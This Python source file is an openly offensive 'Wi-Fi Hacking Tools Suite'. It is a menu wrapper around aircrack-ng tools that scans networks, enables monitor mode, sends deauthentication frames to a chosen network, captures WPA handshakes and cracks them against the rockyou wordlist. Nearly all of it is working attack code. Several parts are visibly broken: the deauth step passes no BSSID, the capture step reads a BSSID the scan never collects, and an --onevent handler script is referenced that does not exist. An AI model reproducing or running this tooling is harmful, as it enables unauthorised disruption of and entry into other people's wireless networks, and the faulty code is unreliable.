#!/usr/bin/env python3
"""
Wi-Fi Hacking Tools Suite
Coded by Cyber Security Engineer: Mr. Sabaz Ali Khan
"""

import os
import subprocess
import time
import json
import sys
from datetime import datetime

# Banner
BANNER = """
⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣤⣤⣄⣀⣀⣀⣀⠀⠀⠀⠀⠀
⢀⣠⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⡿⠛⠉⠉⠙⠿⣿⣿⣿⣿⠿⠋⠉⠉⠛⢿⣿⣿⣿
⣿⣿⣿⣶⣿⣿⣿⣦⠀⢘⣿⣿⡃⠀⣴⣿⣿⣿⣶⣿⣿⣿
⣿⣿⣿⣏⠉⠀⠈⣙⣿⣿⣿⣿⣿⣿⣋⠁⠀⠉⣹⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢸⣿⣿⣎⠻⣿⣿⣿⣿⡿⠋⠙⢿⣿⣿⣿⣿⠟⣱⣿⣿⡇
⠀⢿⣿⣿⣧⠀⠉⠉⠉⠀⢀⡀⠀⠉⠉⠉⠀⣼⣿⣿⡿⠀
⠀⠈⢻⣿⣿⣷⣶⣶⣶⣶⣿⣿⣶⣶⣶⣶⣾⣿⣿⡟⠁⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⠉⠉⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣦⣴⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀
"""

class Color:
    """Terminal color codes."""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    """Clear terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the main banner."""
    print(f"{Color.CYAN}{BANNER}{Color.RESET}")
    print(f"{Color.BOLD}Wi-Fi Hacking Tools Suite{Color.RESET}")
    print(f"{Color.YELLOW}Coded by Cyber Security Engineer: Mr. Sabaz Ali Khan{Color.RESET}")
    print(f"{Color.WHITE}{'='*50}{Color.RESET}")

def check_root():
    """Check if running as root."""
    if os.geteuid() != 0:
        print(f"{Color.RED}[!] This tool requires root privileges.{Color.RESET}")
        print(f"{Color.YELLOW}Run with: sudo python3 {sys.argv[0]}{Color.RESET}")
        return False
    return True

def get_wifi_interfaces():
    """Get available Wi-Fi interfaces."""
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'DEVICE', 'TYPE', 'wifi'], 
                              capture_output=True, text=True)
        interfaces = [line.split(':')[0] for line in result.stdout.strip().split('\n') if line]
        return interfaces
    except Exception as e:
        print(f"{Color.RED}[-] Error getting interfaces: {e}{Color.RESET}")
        return []

def scan_networks(interface):
    """Scan for nearby Wi-Fi networks."""
    print(f"\n{Color.GREEN}[+] Scanning networks on {interface}...{Color.RESET}")
    try:
        # Using nmcli to scan
        subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'], check=True)
        time.sleep(2)
        
        # Get scan results
        result = subprocess.run(['nmcli', '-t', '-f', 'SSID,SIGNAL,SECURITY,CHAN', 'dev', 'wifi', 'list'], 
                              capture_output=True, text=True)
        
        networks = []
        for line in result.stdout.strip().split('\n'):
            if line:
                parts = line.split(':')
                if len(parts) >= 4:
                    networks.append({
                        'ssid': parts[0],
                        'signal': int(parts[1]),
                        'security': parts[2],
                        'channel': parts[3]
                    })
        
        return sorted(networks, key=lambda x: x['signal'], reverse=True)
    
    except Exception as e:
        print(f"{Color.RED}[-] Scan error: {e}{Color.RESET}")
        return []

def display_networks(networks):
    """Display scanned networks in a formatted table."""
    if not networks:
        print(f"{Color.YELLOW}[*] No networks found.{Color.RESET}")
        return
    
    print(f"\n{Color.BOLD}{'='*80}{Color.RESET}")
    print(f"{Color.BOLD}{'SSID':<25} {'Signal':<8} {'Security':<15} {'Channel':<5}")
    print(f"{Color.BOLD}{'-'*80}{Color.RESET}")
    
    for i, net in enumerate(networks, 1):
        signal_color = Color.GREEN if net['signal'] > 70 else (Color.YELLOW if net['signal'] > 40 else Color.RED)
        print(f"{i}. {net['ssid']:<23} {signal_color}{net['signal']}%{Color.RESET:<8} {net['security']:<15} {net['channel']:<5}")
    
    print(f"{Color.BOLD}{'='*80}{Color.RESET}")

def deauth_attack(target_bssid, target_channel, interface, duration=10):
    """Send deauthentication frames to disconnect devices from AP."""
    print(f"\n{Color.YELLOW}[*] Starting deauth attack...{Color.RESET}")
    print(f"   Target BSSID: {target_bssid}")
    print(f"   Channel: {target_channel}")
    print(f"   Interface: {interface}")
    print(f"   Duration: {duration} seconds")
    
    try:
        # Using aireplay-ng for deauth
        cmd = f'airodump-ng --onevent ./deauth_handler.py --update 1 -c {target_channel} {interface} &'
        subprocess.Popen(cmd, shell=True)
        
        time.sleep(2)
        
        # Send deauth packets
        deauth_cmd = f"aireplay-ng --deauth {duration} -a {target_bssid} {interface}"
        result = subprocess.run(deauth_cmd, shell=True, capture_output=True, text=True)
        
        print(f"{Color.GREEN}[+] Deauth attack completed!{Color.RESET}")
        
    except Exception as e:
        print(f"{Color.RED}[-] Deauth error: {e}{Color.RESET}")

def crack_wpa_handshake(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    """Crack WPA handshake using aircrack-ng."""
    print(f"\n{Color.YELLOW}[*] Starting WPA handshake crack...{Color.RESET}")
    print(f"   Cap file: {cap_file}")
    print(f"   Wordlist: {wordlist}")
    
    try:
        if not os.path.exists(wordlist):
            print(f"{Color.RED}[-] Wordlist not found: {wordlist}{Color.RESET}")
            return None
        
        cmd = f"aircrack-ng -w {wordlist} {cap_file}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # Parse output for password
        lines = result.stdout.split('\n')
        for line in lines:
            if 'KEY FOUND!' in line:
                password = line.split('[')[1].split(']')[0]
                print(f"{Color.GREEN}[+] Password found: {password}{Color.RESET}")
                return password
        
        print(f"{Color.RED}[-] Password not found in wordlist.{Color.RESET}")
        return None
        
    except Exception as e:
        print(f"{Color.RED}[-] Crack error: {e}{Color.RESET}")
        return None

def monitor_mode(interface):
    """Enable monitor mode on interface."""
    print(f"\n{Color.YELLOW}[*] Enabling monitor mode on {interface}...{Color.RESET}")
    
    try:
        # Bring interface down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        
        # Change to monitor mode
        subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], check=True)
        
        # Bring interface up
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        
        print(f"{Color.GREEN}[+] Monitor mode enabled on {interface}{Color.RESET}")
        return True
        
    except Exception as e:
        print(f"{Color.RED}[-] Monitor mode error: {e}{Color.RESET}")
        return False

def restore_monitor_mode(interface):
    """Restore normal mode on interface."""
    print(f"\n{Color.YELLOW}[*] Restoring normal mode on {interface}...{Color.RESET}")
    
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        print(f"{Color.GREEN}[+] Normal mode restored{Color.RESET}")
        return True
    except Exception as e:
        print(f"{Color.RED}[-] Restore error: {e}{Color.RESET}")
        return False

def main_menu():
    """Main menu for Wi-Fi hacking tools."""
    while True:
        clear_screen()
        print_banner()
        
        print(f"\n{Color.BOLD}MAIN MENU{Color.RESET}")
        print("1. Scan Networks")
        print("2. Deauth Attack")
        print("3. Capture Handshake")
        print("4. Crack WPA Password")
        print("5. Exit")
        
        choice = input(f"\n{Color.CYAN}Enter your choice [1-5]: {Color.RESET}")
        
        if choice == '1':
            scan_networks_menu()
        elif choice == '2':
            deauth_attack_menu()
        elif choice == '3':
            capture_handshake_menu()
        elif choice == '4':
            crack_password_menu()
        elif choice == '5':
            print(f"\n{Color.GREEN}[+] Thank you for using Wi-Fi Hacking Tools!")
            print(f"{Color.YELLOW}    Coded by Mr. Sabaz Ali Khan{Color.RESET}")
            break
        else:
            print(f"{Color.RED}[-] Invalid choice.{Color.RESET}")
            time.sleep(2)

def scan_networks_menu():
    """Menu for scanning networks."""
    clear_screen()
    print_banner()
    
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print(f"{Color.RED}[-] No Wi-Fi interfaces found.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"\n{Color.BOLD}Available Interfaces:{Color.RESET}")
    for i, iface in enumerate(interfaces, 1):
        print(f"{i}. {iface}")
    
    try:
        iface_choice = int(input(f"\n{Color.CYAN}Select interface [1-{len(interfaces)}]: {Color.RESET}")) - 1
        selected_interface = interfaces[iface_choice]
    except (ValueError, IndexError):
        print(f"{Color.RED}[-] Invalid selection.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    networks = scan_networks(selected_interface)
    display_networks(networks)
    
    input("\nPress Enter to continue...")

def deauth_attack_menu():
    """Menu for deauth attack."""
    clear_screen()
    print_banner()
    
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print(f"{Color.RED}[-] No Wi-Fi interfaces found.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"\n{Color.BOLD}Available Interfaces:{Color.RESET}")
    for i, iface in enumerate(interfaces, 1):
        print(f"{i}. {iface}")
    
    try:
        iface_choice = int(input(f"\n{Color.CYAN}Select interface [1-{len(interfaces)}]: {Color.RESET}")) - 1
        selected_interface = interfaces[iface_choice]
    except (ValueError, IndexError):
        print(f"{Color.RED}[-] Invalid selection.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    networks = scan_networks(selected_interface)
    if not networks:
        print(f"{Color.YELLOW}[*] No networks found.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    display_networks(networks)
    
    try:
        net_choice = int(input(f"\n{Color.CYAN}Select network to attack [1-{len(networks)}]: {Color.RESET}")) - 1
        target_network = networks[net_choice]
    except (ValueError, IndexError):
        print(f"{Color.RED}[-] Invalid selection.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    duration = input(f"{Color.CYAN}Attack duration in seconds [default 10]: {Color.RESET}") or "10"
    
    print(f"\n{Color.YELLOW}[*] Starting deauth attack...{Color.RESET}")
    deauth_attack(None, target_network['channel'], selected_interface, int(duration))
    
    input("\nPress Enter to continue...")

def capture_handshake_menu():
    """Menu for capturing WPA handshake."""
    clear_screen()
    print_banner()
    
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print(f"{Color.RED}[-] No Wi-Fi interfaces found.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"\n{Color.BOLD}Available Interfaces:{Color.RESET}")
    for i, iface in enumerate(interfaces, 1):
        print(f"{i}. {iface}")
    
    try:
        iface_choice = int(input(f"\n{Color.CYAN}Select interface [1-{len(interfaces)}]: {Color.RESET}")) - 1
        selected_interface = interfaces[iface_choice]
    except (ValueError, IndexError):
        print(f"{Color.RED}[-] Invalid selection.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    networks = scan_networks(selected_interface)
    if not networks:
        print(f"{Color.YELLOW}[*] No networks found.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    display_networks(networks)
    
    try:
        net_choice = int(input(f"\n{Color.CYAN}Select network to capture [1-{len(networks)}]: {Color.RESET}")) - 1
        target_network = networks[net_choice]
    except (ValueError, IndexError):
        print(f"{Color.RED}[-] Invalid selection.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    # Start capture
    cap_file = f"capture_{target_network['ssid'].replace(' ', '_')}_{int(time.time())}.pcap"
    print(f"\n{Color.YELLOW}[*] Capturing handshake...{Color.RESET}")
    print(f"   Saving to: {cap_file}")
    
    try:
        # Use airodump-ng to capture
        cmd = f"airodump-ng -c {target_network['channel']} --bssid {target_network.get('bssid', '')} -w {cap_file.replace('.pcap', '')} {selected_interface}"
        print(f"{Color.GREEN}[+] Capture started. Press Ctrl+C to stop.{Color.RESET}")
        subprocess.run(cmd, shell=True)
        
        print(f"{Color.GREEN}[+] Capture saved to {cap_file}{Color.RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{Color.GREEN}[+] Capture stopped.{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Capture error: {e}{Color.RESET}")
    
    input("\nPress Enter to continue...")

def crack_password_menu():
    """Menu for cracking passwords."""
    clear_screen()
    print_banner()
    
    cap_files = [f for f in os.listdir('.') if f.endswith('.pcap')]
    if not cap_files:
        print(f"{Color.RED}[-] No .pcap files found in current directory.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"\n{Color.BOLD}Available .pcap files:{Color.RESET}")
    for i, cap in enumerate(cap_files, 1):
        print(f"{i}. {cap}")
    
    try:
        cap_choice = int(input(f"\n{Color.CYAN}Select capture file [1-{len(cap_files)}]: {Color.RESET}")) - 1
        selected_cap = cap_files[cap_choice]
    except (ValueError, IndexError):
        print(f"{Color.RED}[-] Invalid selection.{Color.RESET}")
        input("\nPress Enter to continue...")
        return
    
    wordlist = input(f"{Color.CYAN}Wordlist path [default /usr/share/wordlists/rockyou.txt]: {Color.RESET}") or "/usr/share/wordlists/rockyou.txt"
    
    password = crack_wpa_handshake(selected_cap, wordlist)
    
    if password:
        print(f"\n{Color.GREEN}[+] SUCCESS! Password: {password}{Color.RESET}")
    else:
        print(f"\n{Color.RED}[-] Password not found.{Color.RESET}")
    
    input("\nPress Enter to continue...")

if __name__ == "__main__":
    if not check_root():
        sys.exit(1)
    
    main_menu()